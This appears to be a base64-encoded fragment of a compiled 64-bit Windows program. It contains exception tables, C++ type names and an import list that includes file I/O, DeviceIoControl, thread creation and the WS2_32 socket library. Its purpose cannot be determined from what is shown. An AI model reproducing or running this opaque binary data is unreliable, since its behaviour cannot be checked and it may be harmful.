AAAAAD/////AAAAAEAAAADghAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAA+IQAAAAAAAAAAAAAuIQAAHCGAABIhgAAIIYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJCwAAAEAAAAAAAAAP////8AAAAAQAAAAHCEAAAAAAAAAAAAAAAAAAABAAAAsAAAAAAAAADAsQAAcIUAAEiFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAAAiIUAAAAAAAAAAAAAyIcAALiFAABwhgAASIYAACCGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcLEAAAMAAAAAAAAA/////wAAAABAAAAA4IUAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAPiFAAAAAAAAAAAAALiFAABwhgAASIYAACCGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADYsAAAAAAAAAgAAAAAAAAABAAAAEAAAABQhwAAAAAAAAAAAAAAAAAAALEAAAEAAAAAAAAAAAAAAAQAAABAAAAA+IYAAAAAAAAAAAAAAAAAACixAAACAAAAAAAAAAAAAAAEAAAAUAAAAJiGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACwhgAAAAAAAAAAAACghwAA0IYAACiHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACxAAABAAAAAAAAAP////8AAAAAQAAAAPiGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAQhwAAAAAAAAAAAADQhgAAKIcAAAAAAAAAAAAAAAAAAAAAAADYsAAAAAAAAAgAAAD/////AAAAAEAAAABQhwAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAaIcAAAAAAAAAAAAAeIcAAAAAAAAAAAAAAAAAANiwAAAAAAAAAAAAAP////8AAAAAQAAAAFCHAAAAAAAAAAAAAAAAAAAosQAAAgAAAAAAAAD/////AAAAAEAAAACYhgAAAAAAAAAAAAAAAAAAwLEAAAQAAAAAAAAA/////wAAAABAAAAAcIUAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAGCyAAAYiAAA8IcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwiAAAAAAAAAAAAACYiAAASIgAAAAAAAAAAAAAAAAAAAAAAAAQsgAAAAAAAAAAAAD/////AAAAAEAAAABwiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAiIgAAAAAAAAAAAAASIgAAAAAAAAAAAAAAAAAAGCyAAABAAAAAAAAAP////8AAAAAQAAAABiIAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAA4swAA6IgAAMCIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAIkAAAAAAAAAAAAAaIkAABiJAAAAAAAAAAAAAAAAAAAAAAAAqLIAAAAAAAAAAAAA/////wAAAABAAAAAQIkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAFiJAAAAAAAAAAAAABiJAAAAAAAAAAAAAAAAAAA4swAAAQAAAAAAAAD/////AAAAAEAAAADoiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEQYCAAYyAjCOXAAAAQAAAG9XAADVVwAAIGIAAAAAAAABBAEABGIAAAkKBAAKNAYACjIGcI5cAAABAAAA6lgAAChaAAA7YgAAKFoAAAEMAgAMAREAAQYCAAYyAlAJFwYAFzQNABdyE8ARcBBgjlwAAAEAAADLXAAA5FwAAFliAADkXAAAERgFABhiFMAScBFgEDAAAI5cAAABAAAAJ10AAEddAACaYgAAAAAAAAkEAQAEQgAAjlwAAAEAAAC3XgAA6l4AANBiAADqXgAAAQoEAAo0CAAKMgZwEQ8CAAZSAjCKYAAA8HQAAP/////yYgAAAGAAAP////8dYAAAAAAAAFpgAAD/////ERMCAApSBjCKYAAAsIAAAP////8AYwAAsEwAAP/////GTAAAAAAAANpMAAD/////IQAAAGBCAACcQgAAEIsAACEFAgAFdAYAYEIAAJxCAAAQiwAAAQYCAAYyAjARGQYAGWQNABQ0DAAGcgJwimAAANiAAAD/////EGMAALBVAAD/////2lUAAAAAAACTVgAA/////xkKAgAKMgZQimAAAACBAAAZIggAIjQQABFyDeAL0AnAB3AGYIpgAAAAgQAAAgAAAAIAAAADAAAAAQAAAJCLAABAAAAAAAAAAAAAAABAYwAAOAAAAP////8gYwAA/////zBjAAABAAAAAAAAAAEAAAAAAAAA/////4BjAADwUwAA/////1hUAAAAAAAAiVQAAAEAAACXVAAAAgAAAEZVAAABAAAAbFUAAAQAAACAVQAA/////0BjAAAAAAAATWMAAAMAAABqYwAAAAAAABkKAgAKMgZQimAAACiBAAAZHwgAHzQPABFyDeAL0AnAB3AGYIpgAAAogQAAAgAAAAIAAAADAAAAAQAAAFyMAABAAAAAAAAAAAAAAACwYwAAOAAAAP////+QYwAA/////6BjAAABAAAAAAAAAAEAAAAAAAAA//////BjAAAgUgAA/////5ZSAAAAAAAAx1IAAAEAAADVUgAAAgAAAIJTAAABAAAAq1MAAAQAAAC/UwAA/////7BjAAAAAAAAvWMAAAMAAADaYwAAAAAAAAEEAQAEggAAGQoCAAoyBlCKYAAAUIEAABkeCAAedA0AGWQMABQ0CgAGcgLAimAAAFCBAAAAAAAAAAAAAAEAAAABAAAAMI0AAEAAAAAAAAAAAAAAAABkAAA4AAAA/////wAAAAD/////AAAAAKBOAAD/////PU8AAAAAAABRTwAA/////wBkAAAAAAAADWQAAAEAAAARFAQAFDQJAAZSAnCKYAAAeIEAAP////8wZAAAcEgAAP////8cSQAAAAAAAFJJAAD/////IQAAAABEAAAuRAAA1I0AACEFAgAFdAYAAEQAAC5EAADUjQAAAQoEAAo0BwAKMgZgAQoEAAo0BgAKMgZwIQACAAB0BgBwPAAAozwAABCLAAAhBQIABXQGAHA8AACjPAAAEIsAABkeAgAGcgIwpGAAAKCBAAAyAAAAwBYAAP/////mFgAAAAAAAB4XAAD/////GR4CAAZyAjCkYAAAyIEAADIAAAAgFgAA/////0YWAAAAAAAAfhYAAP////8ZHgIABnICMKRgAADwgQAAMgAAAP////9AZAAAUBUAAP////92FQAAAAAAAOUVAAD/////GQsDAAtCB1AGMAAAimAAABiCAAAZCgIACjIGUIpgAAAYggAAGSEFABiCFMAScBFgEDAAAIpgAAAYggAAAAAAAAAAAAADAAAAAQAAABiPAAACAAAAAgAAAAMAAAABAAAABI8AAEAAAAAAAAAAAAAAAJBkAABIAAAAQAAAAAAAAAAAAAAAUGQAADgAAAD/////AAAAAP////8AAAAAAQAAAAAAAAABAAAAAAAAAIBQAAD/////7lAAAAAAAABKUQAA/////1BkAAAAAAAAXWQAAAEAAABlZAAAAgAAAHRkAAAAAAAAnmQAAAMAAAAhAAIAAHQGADBOAABRTgAAEIsAACEFAgAFdAYAME4AAFFOAAAQiwAAGTULACd0GQAjZBgAHzQXABMBEgAI0AbABFAAAKRgAABAggAAigAAAP/////QZAAA4DwAAP/////GPQAAAAAAAJw/AAD/////tD8AAAAAAAALQAAA/////yBAAAAAAAAAPEAAAP////8ZNAsAJmQbACI0GgAWARIAC+AJ0AfABXAEUAAApGAAAGiCAACKAAAAUDgAAP////9fOQAAAAAAAOk6AAD/////6zoAAAAAAAAHOwAA/////yY7AAAAAAAAQzsAAP////8BFAgAFGQIABRUBwAUNAYAFDIQcBksCAAeZBQAGjQTAA7SB8AFcARQpGAAAJCCAABqAAAA/////+BkAAAgSgAA/////6ZKAAAAAAAADEwAAP////8wTAAAAAAAAExMAAD/////AQ8GAA9kBwAPNAYADzILcAEUCAAUZAkAFFQIABQ0BwAUMhBwARIIABJUCgASNAkAEjIOwAxwC2AREwIAClIGMIpgAAC4ggAA//////BkAAAAAAAAEGUAAGA3AAD/////jTcAAAAAAACjNwAAAQAAAOk3AAAAAAAA8zcAAP////8RFAQAFDQLAAZSAmCKYAAA4IIAAP////8gZQAAAAAAAFBlAAABAAAAcGUAAIA2AAD/////xDYAAAAAAADmNgAAAQAAAAs3AAACAAAAUjcAAP////8ZKQcADgGMAAfABXAEYANQAjAAAKRgAAAIgwAAUgQAAP////+AZQAAYBIAAP////8BEwAAAAAAAFITAAD/////ERgEABg0CQAKUgZwimAAADCDAAD/////kGUAANBGAAD/////90YAAAAAAAA9RwAA/////xETAgAKUgYwimAAAFiDAAD/////oGUAAAAAAADAZQAAwEUAAP/////tRQAAAAAAAANGAAABAAAASUYAAAAAAABTRgAA/////xEYBAAYNAsAClIGcIpgAACAgwAA/////9BlAAAAAAAAAGYAAAEAAAAgZgAA8EQAAP////8rRQAAAAAAAEpFAAABAAAAa0UAAAIAAACuRQAA/////wEUAgAUUhAwARQIA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BcAAAAAAACAAwAAAAAAAIATAAAAAAAAgA0AAAAAAACAAQAAAAAAAIBzAAAAAAAAgAwAAAAAAACAbwAAAAAAAIAAAAAAAAAAAIgAQ3JlYXRlRmlsZUEAdQRTZXRGaWxlUG9pbnRlckV4AAA0BVdyaXRlRmlsZQDDA1JlYWRGaWxlAAAgAUV4aXRUaHJlYWQAAPgBR2V0RmlsZVNpemVFeAAIAkdldExhc3RFcnJvcgAA4QBEZXZpY2VJb0NvbnRyb2wAUgBDbG9zZUhhbmRsZQC0AENyZWF0ZVRocmVhZAAAS0VSTkVMMzIuZGxsAABXUzJfMzIuZGxsAADXBXN0cmNocgAAswVwcmludGYAAF0FZnB1dGMAGQRfc3RybmljbXAAWQA/PzFiYWRfY2FzdEBzdGRAQFVFQUFAWFoAABUAPz8wYmFkX2Nhc3RAc3RkQEBRRUFBQFBFQkRAWgAAFAA/PzBiYWRfY2FzdEBzdGRAQFFFQUFAQUVCVjAxQEBaAAoBP3doYXRAZXhjZXB0aW9uQHN0ZEBAVUVCQVBFQkRYWgBdAD8/MWV4Y2VwdGlvbkBzdGRAQFVFQUFAWFoAIgA/PzBleGNlcHRpb25Ac3RkQEBRRUFBQEFFQlFFQkRAWgAAJAA/PzBleGNlcHRpb25Ac3RkQEBRRUFBQEFFQlYwMUBAWgAAqwVtZW1tb3ZlAHgAPz9fVUBZQVBFQVhfS0BaAFwEX3VubG9ja19maWxlAACeBW1hbGxvYwAAAQZ1bmdldGMAAFEFZmdldHBvcwAxAl9mc2Vla2k2NABPBWZmbHVzaAAAOAVhdG9pAABQBWZnZXRjAGoFZnNldHBvcwDIBXNldHZidWYA9wJfbG9ja19maWxlAABlAD8/M0BZQVhQRUFYQFoACwRfc3RyZHVwAKoFbWVtY3B5X3MAAG4FZndyaXRlAABMBWZjbG9zZQAASAVleGl0AABjAD8/MkBZQVBFQVhfS0BaAABNU1ZDUjEwMC5kbGwAAH8EX3ZzbnByaW50ZgAAHgFfX0Nfc3BlY2lmaWNfaGFuZGxlcgAAWwRfdW5sb2NrAEgBX19kbGxvbmV4aXQA9gJfbG9jawCdA19vbmV4aXQAngFfYW1zZ19leGl0AABSAV9fZ2V0bWFpbmFyZ3MAGgFfWGNwdEZpbHRlcgAAAl9leGl0ALUBX2NleGl0AABTAV9faW5pdGVudgCGAl9pbml0dGVybQCHAl9pbml0dGVybV9lAMUBX2NvbmZpZ3RocmVhZGxvY2FsZQB8AV9fc2V0dXNlcm1hdGhlcnIAAMQBX2NvbW1vZGUAABwCX2Ztb2RlAAB5AV9fc2V0X2FwcF90eXBlAABGAV9fY3J0X2RlYnVnZ2VyX2hvb2sAAAE/dGVybWluYXRlQEBZQVhYWgDuAD9fdHlwZV9pbmZvX2R0b3JfaW50ZXJuYWxfbWV0aG9kQHR5cGVfaW5mb0BAUUVBQVhYWgBFAT8/Xzc/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEA2QkAAAJoBP19CQURPRkZAc3RkQEAzX0pCAACnAj9jb3V0QHN0ZEBAM1Y/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAMUBBAACVAj9jZXJyQHN0ZEBAM1Y/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAMUBBAACOAj9fWG91dF9vZl9yYW5nZUBzdGRAQFlBWFBFQkRAWgAAngA/PzFfTG9ja2l0QHN0ZEBAUUVBQUBYWgBgAD8/MF9Mb2NraXRAc3RkQEBRRUFBQEhAWgAAjAI/X1hsZW5ndGhfZXJyb3JAc3RkQEBZQVhQRUJEQFoAAA0GP3VuY2F1Z2h0X2V4Y2VwdGlvbkBzdGRAQFlBX05YWgDSAT9fR2V0Z2xvYmFsbG9jYWxlQGxvY2FsZUBzdGRAQENBUEVBVl9Mb2NpbXBAMTJAWFoAqAE/X0Zpb3BlbkBzdGRAQFlBUEVBVV9pb2J1ZkBAUEVCREhIQFoAAP8DP2lkQD8kY29kZWN2dEBEREhAc3RkQEAyVjBsb2NhbGVAMkBBAABCAT8/Xzc/JGJhc2ljX2lzdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEA2QkAAAMgFP3NwdXRuQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUVBQV9KUEVCRF9KQFoAALABP19HZXRjYXRAPyRjb2RlY3Z0QERESEBzdGRAQFNBX0tQRUFQRUJWZmFjZXRAbG9jYWxlQDJAUEVCVjQyQEBaAFMCP19Pc2Z4QD8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFFQUFYWFoA9gE/X0luaXRAPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBJRUFBWFhaAJEFP3NldGdAPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBJRUFBWFBFQUQwMEBaAADsAz9nZXRsb2NAPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUJBP0FWbG9jYWxlQDJAWFoAJgA/PzA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQElFQUFAWFoAFQY/dW5zaGlmdEA/JGNvZGVjdnRARERIQHN0ZEBAUUVCQUhBRUFIUEVBRDFBRUFQRUFEQFoAEQA/PzA/JGJhc2ljX2lzdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBQFBFQVY/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEAxQF9OQFoAHAA/PzA/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBQFBFQVY/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEAxQF9OQFoAAwA/PzA/JGJhc2ljX2lvc0BEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQElFQUFAWFoAmQI/Y2xlYXJAPyRiYXNpY19pb3NARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBWEhfTkBaAADFBT9zcHV0Y0A/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFFQUFIREBaAADmBD9vdXRAPyRjb2RlY3Z0QERESEBzdGRAQFFFQkFIQUVBSFBFQkQxQUVBUEVCRFBFQUQzQUVBUEVBREBaADAEP2luQD8kY29kZWN2dEBEREhAc3RkQEBRRUJBSEFFQUhQRUJEMUFFQVBFQkRQRUFEM0FFQVBFQURAWgAAewA/PzE/JGJhc2ljX2lzdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBVRUFBQFhaAJEDP2ZsdXNoQD8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFFQUFBRUFWMTJAWFoADwE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBQUVBVjAxQFA2QUFFQVYwMUBBRUFWMDFAQFpAWgAAfgA/PzE/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBVRUFBQFhaAJwFP3NldHN0YXRlQD8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUVBQVhIX05AWgB1AD8/MT8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAVUVBQUBYWgA4Bj94c3B1dG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBNRUFBX0pQRUJEX0pAWgA1Bj94c2dldG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBNRUFBX0pQRUFEX0pAWgCsBT9zaG93bWFueWNAPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBNRUFBX0pYWgAAgQA/PzE/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFVFQUFAWFoAawM/ZW5kbEBzdGRAQFlBQUVBVj8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEAxQEFFQVYyMUBAWgAAkQI/YWx3YXlzX25vY29udkBjb2RlY3Z0X2Jhc2VAc3RkQEBRRUJBX05YWgCeAT9fRGVjcmVmQGZhY2V0QGxvY2FsZUBzdGRAQFFFQUFQRUFWMTIzQFhaAPMBP19JbmNyZWZAZmFjZXRAbG9jYWxlQHN0ZEBAUUVBQVhYWgAAOgE/P0JpZEBsb2NhbGVAc3RkQEBRRUFBX0tYWgAATVNWQ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